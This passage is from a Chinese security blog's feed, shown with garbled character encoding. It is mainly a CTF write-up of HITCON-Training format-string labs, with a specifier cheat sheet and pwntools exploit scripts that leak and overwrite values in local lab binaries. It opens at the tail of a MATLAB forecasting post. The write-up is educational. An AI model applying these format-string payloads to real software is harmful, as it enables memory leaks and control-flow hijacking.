function">yys2</span><span class="token punctuation">(</span><span class="token number">j</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token function">yys2</span><span class="token punctuation">(</span><span class="token number">j</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">end</span>x22<span class="token operator">=</span><span class="token number">1</span><span class="token operator">:</span>n2<span class="token punctuation">;</span>xs2<span class="token operator">=</span><span class="token number">2</span><span class="token operator">:</span>n2<span class="token operator">+</span>t_test2<span class="token punctuation">;</span>yn2<span class="token operator">=</span><span class="token function">ys2</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token operator">:</span>n2<span class="token operator">+</span>t_test2<span class="token punctuation">)</span><span class="token punctuation">;</span>det2<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token number">i</span><span class="token operator">=</span><span class="token number">2</span><span class="token operator">:</span>n2    det2<span class="token operator">=</span>det2<span class="token operator">+</span><span class="token function">abs</span><span class="token punctuation">(</span><span class="token function">yn2</span><span class="token punctuation">(</span><span class="token number">i</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token function">y2</span><span class="token punctuation">(</span><span class="token number">i</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">end</span>det2<span class="token operator">=</span>det2<span class="token operator">/</span><span class="token punctuation">(</span>n2<span class="token number">-1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">subplot</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token function">plot</span><span class="token punctuation">(</span>x2<span class="token punctuation">,</span>y2<span class="token punctuation">,</span><span class="token string">'^r-'</span><span class="token punctuation">,</span>xs2<span class="token punctuation">,</span>yn2<span class="token punctuation">,</span><span class="token string">'b-o'</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token function">title</span><span class="token punctuation">(</span><span class="token string">'å…¨åŒºé—´'</span> <span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token function">legend</span><span class="token punctuation">(</span><span class="token string">'å®æµ‹å€¼'</span><span class="token punctuation">,</span><span class="token string">'é¢„æµ‹å€¼'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">disp</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'ç™¾åˆ†ç»å¯¹è¯¯å·®ä¸ºï¼š'</span><span class="token punctuation">,</span><span class="token function">num2str</span><span class="token punctuation">(</span>det2<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">'%'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">disp</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'é¢„æµ‹å€¼ä¸ºï¼š '</span><span class="token punctuation">,</span><span class="token function">num2str</span><span class="token punctuation">(</span><span class="token function">ys2</span><span class="token punctuation">(</span>n2<span class="token operator">+</span><span class="token number">1</span><span class="token operator">:</span>n2<span class="token operator">+</span>t_test2<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>åŸè¿è¡Œæ•ˆæœï¼š</p><p><img src="https://i.loli.net/2018/11/02/5bdb9e4f895b1.png" alt=""></p><p>å°†å‡½æ•°æ”¹ä¸º y = sin(x) åå‘ç°é¢„æµ‹æ•ˆæœä¸å¤§ï¼Œè¿™æ˜¯å› ä¸ºç°è‰²é¢„æµ‹æ¯”è¾ƒé€‚ç”¨äºå•è°ƒå‡½æ•°è€Œéæ³¢åŠ¨æ€§æ¯”è¾ƒå¤§çš„å‡½æ•°ï¼Œå› ä¸ºè¿™ç§æ³¢åŠ¨ä¼šè¢«è§†ä¸ºå¹²æ‰°æ¶ˆé™¤ã€‚</p><p><img src="https://i.loli.net/2018/11/02/5bdb9e005249b.png" alt=""></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;[TOC]&lt;/p&gt;
&lt;h1 id=&quot;ç°è‰²é¢„æµ‹ï¼ˆGrey-modelï¼‰&quot;&gt;&lt;a href=&quot;#ç°è‰²é¢„æµ‹ï¼ˆGrey-modelï¼‰&quot; class=&quot;headerlink&quot; title=&quot;ç°è‰²é¢„æµ‹ï¼ˆGrey modelï¼‰&quot;&gt;&lt;/a&gt;ç°è‰²é¢„æµ‹ï¼ˆGrey modelï¼‰&lt;/h1&gt;&lt;blo
      
    
    </summary>
    
      <category term="ç®—æ³•" scheme="http://www.yof3ng.xyz/categories/%E7%AE%97%E6%B3%95/"/>
    
    
      <category term="algorithm" scheme="http://www.yof3ng.xyz/tags/algorithm/"/>
    
      <category term="ç®—æ³•" scheme="http://www.yof3ng.xyz/tags/%E7%AE%97%E6%B3%95/"/>
    
      <category term="æ•°å­¦æ¨¡å‹" scheme="http://www.yof3ng.xyz/tags/%E6%95%B0%E5%AD%A6%E6%A8%A1%E5%9E%8B/"/>
    
  </entry>
  
  <entry>
    <title>Pwn-10æœˆ26-Hitcon-å››</title>
    <link href="http://www.yof3ng.xyz/2018/10/26/Pwn-10%E6%9C%8826-Hitcon-%E5%9B%9B/"/>
    <id>http://www.yof3ng.xyz/2018/10/26/Pwn-10æœˆ26-Hitcon-å››/</id>
    <published>2018-10-26T05:21:15.000Z</published>
    <updated>2018-10-26T09:07:16.750Z</updated>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h1 id="Pwn-10æœˆ26-Hitcon-å››"><a href="#Pwn-10æœˆ26-Hitcon-å››" class="headerlink" title="Pwn-10æœˆ26-Hitcon-å››"></a>Pwn-10æœˆ26-Hitcon-å››</h1><blockquote><p>ç»ƒä¹ Hitconçš„ç¬¬å››å¤©ğŸ·ï¼Œæ„‰å¿«åœ°å­¦ä¹ fsbï¼ˆFormat string bugï¼‰ï¼Œæ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ã€‚</p></blockquote><h2 id="lab7-crack"><a href="#lab7-crack" class="headerlink" title="lab7-crack"></a>lab7-crack</h2><blockquote><p>å¥½ğŸ‘ï¼Œè¿™é¢˜å¼€å§‹æ¥è§¦æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ã€‚</p><p>ä»€ä¹ˆæ˜¯æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ï¼Ÿæˆ‘ä»¬çŸ¥é“c/c++ä¸­<code>printf</code>å‡½æ•°è¾“å‡ºå€¼éœ€è¦å¯¹åº”çš„å‚æ•°ï¼Œä½†å½“æä¾›çš„å‚æ•°å‡ºç°é—®é¢˜ï¼Œæˆ–è€…æ²¡æœ‰æä¾›å‚æ•°çš„æ—¶å€™ï¼Œæ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´å°±å¯èƒ½å‡ºç°äº†ã€‚<a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/fmtstr/fmtstr_intro/#_6" target="_blank" rel="noopener">CTF-wikiä¼ é€é—¨</a></p><p>é‚£ä¹ˆå‡è®¾ï¼Œæ­¤æ—¶æˆ‘ä»¬åœ¨ç¼–å†™ç¨‹åºæ—¶å€™ï¼Œå†™æˆäº†ä¸‹é¢çš„æ ·å­</p><pre><code>printf(&quot;Color %s, Number %d, Float %4.2f&quot;);</code></pre><p>æ­¤æ—¶æˆ‘ä»¬å¯ä»¥å‘ç°æˆ‘ä»¬å¹¶æ²¡æœ‰æä¾›å‚æ•°ï¼Œé‚£ä¹ˆç¨‹åºä¼šå¦‚ä½•è¿è¡Œå‘¢ï¼Ÿç¨‹åºç…§æ ·ä¼šè¿è¡Œï¼Œä¼šå°†æ ˆä¸Šå­˜å‚¨æ ¼å¼åŒ–å­—ç¬¦ä¸²åœ°å€ä¸Šé¢çš„ä¸‰ä¸ªå˜é‡åˆ†åˆ«è§£æä¸º</p><ol><li><strong>è§£æå…¶åœ°å€å¯¹åº”çš„å­—ç¬¦ä¸²</strong></li><li>è§£æå…¶å†…å®¹å¯¹åº”çš„æ•´å½¢å€¼</li><li>è§£æå…¶å†…å®¹å¯¹åº”çš„æµ®ç‚¹å€¼</li></ol><p>ç”±æ­¤å¯è§<a href="http://www.cnblogs.com/Ox9A82/p/5429099.html" target="_blank" rel="noopener">æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´</a>ä¸»è¦æ˜¯ï¼š</p><ul><li><p><strong>1.æ³„æ¼ä»»æ„åœ°å€çš„å€¼ï¼Œleakå†…å­˜ï¼ˆæ¯”å¦‚leakå‡ºlibcåŸºåœ°å€ï¼‰</strong></p></li><li><p><strong>2.å†™ä»»æ„åœ°å€ï¼Œå¯ç”¨äºä¿®æ”¹gotè¡¨</strong></p></li></ul></blockquote><pre class=" language-bash"><code class="language-bash">è¿™éƒ¨åˆ†æ¥è‡ªicemakrçš„åšå®¢ <span class="token operator">==</span><span class="token operator">></span>å‘å¤§ä½¬è‡´æ•¬32ä½è¯»<span class="token string">'%{}<span class="token variable">$x</span>'</span>.format<span class="token punctuation">(</span>index<span class="token punctuation">)</span>           // è¯»4ä¸ªå­—èŠ‚<span class="token string">'%{}<span class="token variable">$p</span>'</span>.format<span class="token punctuation">(</span>index<span class="token punctuation">)</span>           // åŒä¸Šé¢<span class="token string">'${}<span class="token variable">$s</span>'</span>.format<span class="token punctuation">(</span>index<span class="token punctuation">)</span>å†™<span class="token string">'%{}<span class="token variable">$n</span>'</span>.format<span class="token punctuation">(</span>index<span class="token punctuation">)</span>           // è§£å¼•ç”¨ï¼Œå†™å…¥å››ä¸ªå­—èŠ‚<span class="token string">'%{}<span class="token variable">$hn</span>'</span>.format<span class="token punctuation">(</span>index<span class="token punctuation">)</span>          // è§£å¼•ç”¨ï¼Œå†™å…¥ä¸¤ä¸ªå­—èŠ‚<span class="token string">'%{}<span class="token variable">$hhn</span>'</span>.format<span class="token punctuation">(</span>index<span class="token punctuation">)</span>         // è§£å¼•ç”¨ï¼Œå†™å…¥ä¸€ä¸ªå­—èŠ‚<span class="token string">'%{}<span class="token variable">$lln</span>'</span>.format<span class="token punctuation">(</span>index<span class="token punctuation">)</span>         // è§£å¼•ç”¨ï¼Œå†™å…¥å…«ä¸ªå­—èŠ‚64ä½è¯»<span class="token string">'%{}<span class="token variable">$x</span>'</span>.format<span class="token punctuation">(</span>index, num<span class="token punctuation">)</span>      // è¯»4ä¸ªå­—èŠ‚<span class="token string">'%{}<span class="token variable">$lx</span>'</span>.format<span class="token punctuation">(</span>index, num<span class="token punctuation">)</span>     // è¯»8ä¸ªå­—èŠ‚<span class="token string">'%{}<span class="token variable">$p</span>'</span>.format<span class="token punctuation">(</span>index<span class="token punctuation">)</span>           // è¯»8ä¸ªå­—èŠ‚<span class="token string">'${}<span class="token variable">$s</span>'</span>.format<span class="token punctuation">(</span>index<span class="token punctuation">)</span>å†™<span class="token string">'%{}<span class="token variable">$n</span>'</span>.format<span class="token punctuation">(</span>index<span class="token punctuation">)</span>           // è§£å¼•ç”¨ï¼Œå†™å…¥å››ä¸ªå­—èŠ‚<span class="token string">'%{}<span class="token variable">$hn</span>'</span>.format<span class="token punctuation">(</span>index<span class="token punctuation">)</span>          // è§£å¼•ç”¨ï¼Œå†™å…¥ä¸¤ä¸ªå­—èŠ‚<span class="token string">'%{}<span class="token variable">$hhn</span>'</span>.format<span class="token punctuation">(</span>index<span class="token punctuation">)</span>         // è§£å¼•ç”¨ï¼Œå†™å…¥ä¸€ä¸ªå­—èŠ‚<span class="token string">'%{}<span class="token variable">$lln</span>'</span>.format<span class="token punctuation">(</span>index<span class="token punctuation">)</span>         // è§£å¼•ç”¨ï¼Œå†™å…¥å…«ä¸ªå­—èŠ‚%1<span class="token variable">$lx</span><span class="token keyword">:</span> RSI%2<span class="token variable">$lx</span><span class="token keyword">:</span> RDX%3<span class="token variable">$lx</span><span class="token keyword">:</span> RCX%4<span class="token variable">$lx</span><span class="token keyword">:</span> R8%5<span class="token variable">$lx</span><span class="token keyword">:</span> R9%6<span class="token variable">$lx</span><span class="token keyword">:</span> æ ˆä¸Šçš„ç¬¬ä¸€ä¸ªQWORD</code></pre><h3 id="æ£€æŸ¥ä¿æŠ¤æªæ–½"><a href="#æ£€æŸ¥ä¿æŠ¤æªæ–½" class="headerlink" title="æ£€æŸ¥ä¿æŠ¤æªæ–½"></a>æ£€æŸ¥ä¿æŠ¤æªæ–½</h3><blockquote><p>æŒ‰å¥—è·¯æ¥ï¼Œå…ˆ<code>checksec crack</code>:</p><p><img src="https://i.loli.net/2018/10/26/5bd2aa6e80564.png" alt=""></p><p>å¯ä»¥çœ‹åˆ°å¼€å¯äº†æ ˆæº¢å‡ºä¿æŠ¤(canary found)ï¼Œä»¥åŠæ ˆä¸å¯æ‰§è¡Œ(NX)æªæ–½ï¼Œå¾ˆæ˜æ˜¾è®©æˆ‘ä»¬ä»åˆ«å¤„å…¥æ‰‹ã€‚</p><p>ç®€å•è¿è¡Œä¸€ä¸‹ï¼š</p><p><img src="https://i.loli.net/2018/10/26/5bd2aacec0ef5.png" alt=""></p><p>æˆ‘ä»¬éœ€è¦è¾“å…¥ä¸¤ä¸ªå€¼ï¼Œä¸€ä¸ªæ˜¯nameï¼Œè¾“å…¥ä¹‹åä¼šè¢«æ‰“å°ï¼Œä¸€ä¸ªæ˜¯passwordã€‚</p><p><a href="http://m4x.fun/post/hitcon-training-writeup/#lab7-crack" target="_blank" rel="noopener">m4xå¸ˆå‚…</a>çš„é€»è¾‘ï¼š<code>è¾“å‡º name æ—¶æœ‰æ˜æ˜¾çš„æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ï¼Œè¿™ä¸ªé¢˜çš„æ€è·¯æœ‰å¾ˆå¤šï¼Œå¯ä»¥åˆ©ç”¨ fsb æ”¹å†™ passwordï¼Œæˆ–è€… leak å‡º passwordï¼Œä¹Ÿå¯ä»¥ç›´æ¥é€šè¿‡ fsbï¼Œhijack puts_got åˆ° system(â€œcat flagâ€) å¤„ï¼ˆæ³¨æ„è¿™é‡Œ printf å®é™…è°ƒç”¨äº† putsï¼‰</code>ã€‚</p></blockquote><h3 id="é€»è¾‘åˆ†æ"><a href="#é€»è¾‘åˆ†æ" class="headerlink" title="é€»è¾‘åˆ†æ"></a>é€»è¾‘åˆ†æ</h3><blockquote><p>idaproå¯åŠ¨ï¼ï¼å¯åŠ¨ï¼ï¼ç»™æˆ‘å¯åŠ¨å•Šï¼ï¼ğŸ™ƒï¼mainå‡½æ•°ï¼š</p><p><img src="https://i.loli.net/2018/10/26/5bd2ac48e9124.png" alt=""></p></blockquote><h4 id="exp1ï¼šé€šè¿‡æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´æ³„éœ²password"><a href="#exp1ï¼šé€šè¿‡æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´æ³„éœ²password" class="headerlink" title="exp1ï¼šé€šè¿‡æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´æ³„éœ²password"></a>exp1ï¼šé€šè¿‡æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´æ³„éœ²password</h4><blockquote><p><img src="https://i.loli.net/2018/10/26/5bd2b96d60a25.png" alt=""></p><p>ç®€å•æµ‹è¯•ä¸€ä¸‹æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ä¸€äº›æœ‰è¶£çš„ä¸œè¥¿ï¼Œè¿™äº›åº”è¯¥æ˜¯<code>printf</code>æ ˆä¸­çš„æ•°æ®ï¼Œé‚£ä¹ˆæˆ‘ä»¬åªè¦æ‰¾åˆ°æ ˆä¸­å­˜å‚¨æˆ‘ä»¬è¾“å…¥çš„å†…å®¹çš„ä½ç½®ï¼Œå‡å¦‚è¾“å…¥çš„æ˜¯æŸåœ°å€ï¼Œå†ç”¨%sè§£æå°±å¯è·å¾—è¯¥åœ°å€ä¸‹çš„å†…å®¹ï¼š</p><p><img src="https://i.loli.net/2018/10/26/5bd2bb34567e1.png" alt=""></p><p><img src="https://i.loli.net/2018/10/26/5bd2c986ab76f.png" alt=""></p><p>å¯ä»¥çœ‹åˆ°è¾“å…¥çš„å†…å®¹åœ¨æ ˆä¸­çš„ç¬¬åä¸ªä½ç½®ï¼Œè‡³äºä¸ºä»€ä¹ˆåœ¨gdbçœ‹æ ˆä¸­æ•°æ®åœ¨ç¬¬åä¸€ä¸ªä½ç½®ï¼Œæ˜¯å› ä¸ºâ€Hello ,â€è¿˜æ²¡æœ‰è¢«è¾“å‡ºï¼Œå¾…å…¶è¾“å‡ºåæˆ‘ä»¬çš„è¾“å…¥å°±æ¥åˆ°äº†ç¬¬åä¸ªä½ç½®ã€‚</p><p>è¿™é‡Œå­¦åˆ°ä¸€ä¸ªå°çŸ¥è¯†ï¼Œ<code>%10$s</code>ä¸­æ ¼å¼åŒ–å­—ç¬¦ä¸²çš„â€œ$â€æ“ä½œç¬¦ï¼Œå…¶å…è®¸æˆ‘ä»¬ä»æ ¼å¼åŒ–å­—ç¬¦ä¸²ä¸­é€‰å–ä¸€ä¸ªä½ç½®çš„å‚æ•°ä½œä¸ºç‰¹å®šçš„å‚æ•°ã€‚æˆ‘ä»¬å¯ä»¥ä»IDAä¸­å¾—åˆ°<code>password_addr=0x804A080</code>ï¼Œç„¶åæ„é€ EXPã€‚</p></blockquote><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#coding:utf-8</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">from</span> libnum <span class="token keyword">import</span> n2scontext<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">"debug"</span>io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./crack'</span><span class="token punctuation">)</span>pwd_addr<span class="token operator">=</span> <span class="token number">0x804A048</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">' ?'</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>p32<span class="token punctuation">(</span>pwd_addr<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"|%10$x||"</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'|'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#drop = True è¡¨ç¤ºä¸¢å¼ƒpatternï¼Œä¸æ¥å—pattern</span>pwd <span class="token operator">=</span> str<span class="token punctuation">(</span>u32<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'||'</span><span class="token punctuation">,</span>drop <span class="token operator">=</span> <span class="token boolean">True</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">" :"</span><span class="token punctuation">,</span>pwd<span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>è¿è¡Œæ•ˆæœï¼š</p><p><img src="https://i.loli.net/2018/10/26/5bd2bd871ce46.png" alt=""></p><h4 id="exp2ï¼šä¿®æ”¹éšæœºæ•°"><a href="#exp2ï¼šä¿®æ”¹éšæœºæ•°" class="headerlink" title="exp2ï¼šä¿®æ”¹éšæœºæ•°"></a>exp2ï¼šä¿®æ”¹éšæœºæ•°</h4><blockquote><p>ç®€å•äº†è§£fmtsträ¹‹åï¼ŒçŸ¥é“åŸæ¥è¿˜æœ‰è¿™ä¹ˆéªšçš„pwntoolsæ¨¡å—ï¼Œè¿™é‡Œç®€å•å¯¹è¿™ä¸ªexpåšä¸ªåˆ†æç†è§£ã€‚</p></blockquote><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#æ¥è‡ªVeritas501å¤§ä½¬çš„exp</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>cn <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./crack'</span><span class="token punctuation">)</span>p_pwd <span class="token operator">=</span> <span class="token number">0x0804A048</span>fmt_len <span class="token operator">=</span> <span class="token number">10</span>cn<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>pay <span class="token operator">=</span> fmtstr_payload<span class="token punctuation">(</span>fmt_len<span class="token punctuation">,</span><span class="token punctuation">{</span>p_pwd<span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">}</span><span class="token punctuation">)</span>cn<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>pay<span class="token punctuation">)</span>cn<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>cn<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">)</span>cn<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>cn<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>è¿è¡Œæ•ˆæœ:</p><p><img src="https://i.loli.net/2018/10/26/5bd2c4a2645c3.png" alt=""></p><h2 id="lab8-craxme"><a href="#lab8-craxme" class="headerlink" title="lab8-craxme"></a>lab8-craxme</h2><blockquote><p>è¿™ä¹Ÿæ˜¯ä¸€é¢˜æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ğŸ˜„ï¼Œæˆ‘ä»¬å¯ä»¥ç›´æ¥é€šè¿‡ç±»ä¼¼ä¸Šé¢é¢˜exp2çš„æ–¹å¼æ¥ä¿®æ”¹å€¼è¾¾åˆ°ç›®çš„ã€‚</p></blockquote><h3 id="æ£€æŸ¥ä¿æŠ¤æªæ–½-1"><a href="#æ£€æŸ¥ä¿æŠ¤æªæ–½-1" class="headerlink" title="æ£€æŸ¥ä¿æŠ¤æªæ–½"></a>æ£€æŸ¥ä¿æŠ¤æªæ–½</h3><blockquote><p><code>checksec craxme</code>:</p><p><img src="https://i.loli.net/2018/10/26/5bd2cbf09c0e6.png" alt=""></p><p>å¯ä»¥çœ‹åˆ°å‡ ä¹æ‰€æœ‰ä¿æŠ¤æªæ–½éƒ½æ‰“å¼€ï¼Œæ— æ³•é€šè¿‡æ ˆæº¢å‡ºæˆ–è€…æ ˆæ‰§è¡Œç­‰æ¼æ´è¿›è¡Œæ”»å‡»ã€‚</p></blockquote><h3 id="é€»è¾‘åˆ†æ-1"><a href="#é€»è¾‘åˆ†æ-1" class="headerlink" title="é€»è¾‘åˆ†æ"></a>é€»è¾‘åˆ†æ</h3><blockquote><p>åƒlab7ä¸€æ ·ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨idaé‡Œé¢çœ‹åˆ°æœ‰æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ï¼š</p><p><img src="https://i.loli.net/2018/10/26/5bd2cc3c37cec.png" alt=""></p><p>æˆ‘ä»¬å¯ä»¥è¿è¡Œä¸€ä¸‹è¯•è¯•</p><p><img src="https://i.loli.net/2018/10/26/5bd2cb30efb76.png" alt=""></p><p>å¯ä»¥çœ‹åˆ°åœ¨printfå‡½æ•°æ ˆä¸­ç¬¬ä¸ƒä¸ªä½ç½®æ˜¯æˆ‘ä»¬è¾“å…¥çš„å†…å®¹ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯åˆ©ç”¨pwntoolsçš„fmtstr_payloadæ¥æ”¹å˜magicçš„å€¼ã€‚</p><p>é€šè¿‡idaæ‰¾åˆ°magicçš„åœ°å€ï¼š</p><p><img src="https://i.loli.net/2018/10/26/5bd2cd771b79f.png" alt=""></p><p>é€šè¿‡Pwntools.ELF:</p><p><img src="https://i.loli.net/2018/10/26/5bd2ce6d80f25.png" alt=""></p></blockquote><h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/env python</span><span class="token comment" spellcheck="true"># -*- coding: utf-8 -*-</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">"debug"</span>magicAddr <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./craxme"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">"magic"</span><span class="token punctuation">]</span>inputs <span class="token operator">=</span> int<span class="token punctuation">(</span>input<span class="token punctuation">(</span><span class="token string">"[+]1.flag\n[+]2.craxflag\ninput:"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">if</span> inputs <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>    payload <span class="token operator">=</span> fmtstr_payload<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>magicAddr<span class="token punctuation">:</span> <span class="token number">0xda</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    payload <span class="token operator">=</span> fmtstr_payload<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>magicAddr<span class="token punctuation">:</span> <span class="token number">0xfaceb00c</span><span class="token punctuation">}</span><span class="token punctuation">)</span>io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./craxme"</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">" :"</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>è¿è¡Œæ•ˆæœï¼š</p><p><img src="https://i.loli.net/2018/10/26/5bd2cfce6cf83.png" alt=""></p><blockquote><p>ä»Šå¤©çš„æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´å°±å­¦åˆ°è¿™å„¿å•¦ï¼Œéš¾å—ğŸ˜­ã€‚</p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;[TOC]&lt;/p&gt;
&lt;h1 id=&quot;Pwn-10æœˆ26-Hitcon-å››&quot;&gt;&lt;a href=&quot;#Pwn-10æœˆ26-Hitcon-å››&quot; class=&quot;headerlink&quot; title=&quot;Pwn-10æœˆ26-Hitcon-å››&quot;&gt;&lt;/a&gt;Pwn-10æœˆ26-Hitcon-å››&lt;
      
    
    </summary>
    
      <category term="CTF" scheme="http://www.yof3ng.xyz/categories/CTF/"/>
    
    
      <category term="Pwn" scheme="http://www.yof3ng.xyz/tags/Pwn/"/>
    
      <category term="CTF" scheme="http://www.yof3ng.xyz/tags/CTF/"/>
    
      <category term="äºŒè¿›åˆ¶å®‰å…¨" scheme="http://www.yof3ng.xyz/tags/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>Pwn-10æœˆ25-Hitcon(ä¸‰)</title>
    <link href="http://www.yof3ng.xyz/2018/10/25/Pwn-10%E6%9C%8825-Hitcon-%E4%B8%89/"/>
    <id>http://www.yof3ng.xyz/2018/10/25/Pwn-10æœˆ25-Hitcon-ä¸‰/</id>
    <published>2018-10-25T00:54:34.000Z</published>
    <updated>2018-10-25T09:16:07.488Z</updated>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h1 id="Pwn-10æœˆ25-Hitcon-ä¸‰"><a href="#Pwn-10æœˆ25-Hitcon-ä¸‰" class="headerlink" title="Pwn-10æœˆ25-Hitcon(ä¸‰)"></a>Pwn-10æœˆ25-Hitcon(ä¸‰)</h1><blockquote><p>ä¸€å¤©ä¸€å¤©æ…¢æ…¢æ¥ï¼ŒğŸ˜­</p></blockquote><h2 id="lab6-migration"><a href="#lab6-migration" class="headerlink" title="lab6-migration"></a>lab6-migration</h2><blockquote><p>è¿™ä¸ªé¢˜ç›®æ¶‰åŠåˆ°æ ˆè¿ç§»(stack-pivot)ï¼Œåœ¨<a href="https://ctf-wiki.github.io/ctf-wiki/pwn/stackoverflow/others/#stack-pivoting" target="_blank" rel="noopener">ctf-wiki</a>ä¸Šé¢æ˜¯æœ‰è¿™ä¸ªä¾‹é¢˜å’Œè§£é‡Šçš„ã€‚</p><blockquote><p>è¯¥æŠ€å·§å°±æ˜¯åŠ«æŒæ ˆæŒ‡é’ˆæŒ‡å‘æ”»å‡»è€…æ‰€èƒ½æ§åˆ¶çš„å†…å­˜å¤„ï¼Œç„¶åå†åœ¨ç›¸åº”çš„ä½ç½®è¿›è¡Œ ROPã€‚ä¸€èˆ¬æ¥è¯´ï¼Œæˆ‘ä»¬å¯èƒ½åœ¨ä»¥ä¸‹æƒ…å†µéœ€è¦ä½¿ç”¨ stack pivoting</p><ul><li>å¯ä»¥æ§åˆ¶çš„æ ˆæº¢å‡ºçš„å­—èŠ‚æ•°è¾ƒå°‘ï¼Œéš¾ä»¥æ„é€ è¾ƒé•¿çš„ ROP é“¾</li><li>å¼€å¯äº† PIE ä¿æŠ¤ï¼Œæ ˆåœ°å€æœªçŸ¥ï¼Œæˆ‘ä»¬å¯ä»¥å°†æ ˆåŠ«æŒåˆ°å·²çŸ¥çš„åŒºåŸŸã€‚</li><li>å…¶å®ƒæ¼æ´éš¾ä»¥åˆ©ç”¨ï¼Œæˆ‘ä»¬éœ€è¦è¿›è¡Œè½¬æ¢ï¼Œæ¯”å¦‚è¯´å°†æ ˆåŠ«æŒåˆ°å 